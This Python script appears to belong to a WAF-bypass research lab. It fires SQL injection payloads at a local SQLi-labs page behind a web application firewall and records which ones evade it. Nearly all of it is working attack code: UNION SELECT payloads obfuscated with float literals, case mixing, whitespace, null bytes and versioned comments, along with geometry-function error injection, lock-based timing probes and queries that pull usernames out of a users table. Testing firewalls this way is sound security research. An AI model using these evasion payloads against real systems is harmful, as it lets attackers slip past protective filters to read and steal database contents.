"""
bypass_lab/test_novel.py
=========================
Novel techniques not tried before.

Key hypotheses:
  1. Float literal BETWEEN boolean operator and UNION disrupts ML pattern:
       '-1' OR -.6e0 UNION SELECT...
     ML was trained on 'OR/AND <expr> UNION SELECT' but not with float noise

  2. MySQL geometry/spatial functions for error exfil — rarely in training data

  3. GET_LOCK / WAIT timing via obscure functions

  4. Making payload look like legitimate analytics/business SQL
"""
import sys, time
sys.path.insert(0, '/mnt/d/Kuliah/RL/SeqSQLi')
from seqsqli.core.response import classify_response
import requests

WAF   = "http://localhost:8888/Less-1/"
PLAIN = "http://localhost:8081/Less-1/"
M     = "'SEQSQLI_START','SEQSQLI_END'"
FOUND = []

def t(label, payload, url=WAF, check_plain=False):
    if check_plain:
        rp = requests.get(PLAIN, params={"id": payload}, timeout=8)
        plain_ok = classify_response(rp.text, rp.status_code, "union", strict_markers=True) == "SUCCESS"
        if not plain_ok:
            print(f"  [PLAIN-FAIL] {label} — skip")
            time.sleep(0.1)
            return
    r = requests.get(url, params={"id": payload}, timeout=8)
    ok = classify_response(r.text, r.status_code, "union", strict_markers=True) == "SUCCESS"
    tag = "*** BYPASS ***" if ok else ("BLOCK" if r.status_code==403 else str(r.status_code))
    print(f"  [{tag}] {label}")
    if ok:
        FOUND.append((label, payload))
    time.sleep(0.25)

def tb(label, payload, url=WAF):
    """Test error/blind injection — check HTTP status and response length."""
    r = requests.get(url, params={"id": payload}, timeout=8)
    tag = "BLOCK" if r.status_code==403 else f"PASS({r.status_code},len={len(r.text)})"
    print(f"  [{tag}] {label}")
    if r.status_code != 403:
        FOUND.append((label, payload))
    time.sleep(0.25)


# ── A: Float noise between boolean op and UNION ────────────────────────
# Hypothesis: 'OR <float> UNION SELECT' is not in Safeline training data
print("\n[A] Float noise: OR/AND <float> UNION SELECT")
floats = [
    "-.6e0", ".6e0", "-0.0", ".0", "1e-9", "-.1e1",
    "-3.14e0", ".001e3", "1.23e-4", "-1e-10",
    "0.0e0", "-0.1e0", ".9e-9", "1.0e-99",
]
for f in floats:
    t(f"OR {f} UNION",  f"-1' OR {f} UNION SELECT database(),{M}-- -")
    t(f"AND {f} UNION", f"1' AND {f} UNION SELECT database(),{M}-- -")

print("\n[A2] Float noise + case variation")
for f in ["-.6e0", ".6e0", "-0.0", "1e-9"]:
    t(f"OR {f} uNiOn",  f"-1' OR {f} uNiOn sElEcT database(),{M}-- -")
    t(f"OR {f}+tab",    f"-1' OR {f}\tUNION\tSELECT\tdatabase(),{M}-- -")
    t(f"OR {f}+newline",f"-1' OR {f}\nUNION\nSELECT\ndatabase(),{M}-- -")
    t(f"OR {f}+null",   f"-1' OR {f} UNION SELECT database(),{M};%00")

# ── B: Geometry/spatial functions (MySQL 5.7 error-based) ─────────────
# These functions cause MySQL errors that leak data — rarely in WAF training
print("\n[B] MySQL geometry function error injection")
geo_tests = [
    ("geometrycollection",
     "1 AND GEOMETRYCOLLECTION((SELECT * FROM(SELECT database())a))-- -"),
    ("polygon",
     "1 AND POLYGON((SELECT * FROM(SELECT database())a))-- -"),
    ("multipoint",
     "1 AND MULTIPOINT((SELECT * FROM(SELECT database())a))-- -"),
    ("multilinestring",
     "1 AND MULTILINESTRING((SELECT * FROM(SELECT database())a))-- -"),
    ("multipolygon",
     "1 AND MULTIPOLYGON((SELECT * FROM(SELECT database())a))-- -"),
    ("linestring",
     "1 AND LINESTRING((SELECT * FROM(SELECT database())a))-- -"),
    ("st_geomfromtext",
     "1 AND ST_GeomFromText((SELECT * FROM(SELECT database())a))-- -"),
    ("geom+case",
     "1 AND gEoMeTrYcOlLeCtIoN((SELECT * FROM(SELECT database())a))-- -"),
    ("geom+union",
     "-1' UNION SELECT GEOMETRYCOLLECTION((SELECT database())),{M}-- -".format(M=M)),
]
for label, p in geo_tests:
    tb(label, p)

# ── C: Obscure timing functions ────────────────────────────────────────
print("\n[C] Obscure timing/lock functions (not SLEEP/BENCHMARK)")
timing = [
    ("get_lock 0s",       "1' AND GET_LOCK('seqsqli',0)-- -"),
    ("get_lock 1s",       "1' AND GET_LOCK('seqsqli',1)=1-- -"),
    ("release_lock",      "1' AND RELEASE_LOCK('seqsqli')-- -"),
    ("is_free_lock",      "1' AND IS_FREE_LOCK('x')=1-- -"),
    ("is_used_lock",      "1' AND IS_USED_LOCK('x') IS NULL-- -"),
]
for label, p in timing:
    tb(label, p)

# ── D: Making injection look like legitimate business SQL ──────────────
print("\n[D] 'Legitimate-looking' injection")
legit = [
    ("analytics-style union",
     f"-1' UNION SELECT COUNT(id),database(),GROUP_CONCAT(username) FROM users-- -"),
    ("report union",
     f"-1' UNION SELECT AVG(id),database(),MAX(id) FROM users-- -"),
    ("subquery-based",
     f"1' AND (SELECT COUNT(*) FROM users WHERE username=database())>0-- -"),
    ("in-list extraction",
     f"1' AND database() IN ('security','mysql','information_schema')-- -"),
    ("between extraction",
     f"1' AND LENGTH(database()) BETWEEN 1 AND 99-- -"),
    ("like extraction",
     f"1' AND database() LIKE 's%'-- -"),
    ("regexp extraction",
     f"1' AND database() REGEXP '^s'-- -"),
    ("sounds like",
     f"1' AND database() SOUNDS LIKE 'sycurity'-- -"),
    ("compare with subq",
     f"1' AND database()=(SELECT schema_name FROM information_schema.schemata LIMIT 1,1)-- -"),
]
for label, p in legit:
    tb(label, p)

# ── E: Procedure-based (MySQL 5.7) ────────────────────────────────────
print("\n[E] MySQL PROCEDURE / internal tricks")
proc = [
    ("procedure analyse",
     f"-1' UNION SELECT database(),{M} PROCEDURE ANALYSE(1,1)-- -"),
    ("procedure analyse2",
     f"1 PROCEDURE ANALYSE(1,1)-- -"),
    ("into outfile /dev/null",
     f"-1' UNION SELECT database(),{M} INTO OUTFILE '/dev/null'-- -"),
    ("into @var",
     f"-1' UNION SELECT database() INTO @_d-- -"),
]
for label, p in proc:
    tb(label, p)

# ── F: Combining float-OR with other bypasses ─────────────────────────
print("\n[F] Float-OR combo with other techniques")
combos = [
    ("float-OR+comment",
     f"-1' OR -.6e0/**/UNION/**/SELECT database(),{M}-- -"),
    ("float-OR+versioned",
     f"-1' OR -.6e0 /*!UNION*/ /*!SELECT*/ database(),{M}-- -"),
    ("float-OR+null_byte",
     f"-1' OR -.6e0 UNION SELECT database(),{M};\x00"),
    ("float-OR+case+null",
     f"-1' OR -.6e0 uNiOn sElEcT dAtAbAsE(),{M};\x00"),
    ("float-OR+a0",
     f"-1' OR -.6e0%a0UNION%a0SELECT%a0database(),{M}-- -"),
    ("multi-float-OR",
     f"-1' OR -.6e0 OR .0e0 UNION SELECT database(),{M}-- -"),
    ("float-XOR",
     f"-1' XOR -.6e0 UNION SELECT database(),{M}-- -"),
    ("float-&&",
     f"-1' && -.6e0 UNION SELECT database(),{M}-- -"),
    ("float-||",
     f"-1' || -.6e0 UNION SELECT database(),{M}-- -"),
]
for label, p in combos:
    t(label, p)

# ── Summary ────────────────────────────────────────────────────────────
print("\n" + "="*60)
print(f" FOUND: {len(FOUND)}")
for label, p in FOUND:
    print(f"  {label}: {p[:100]}")
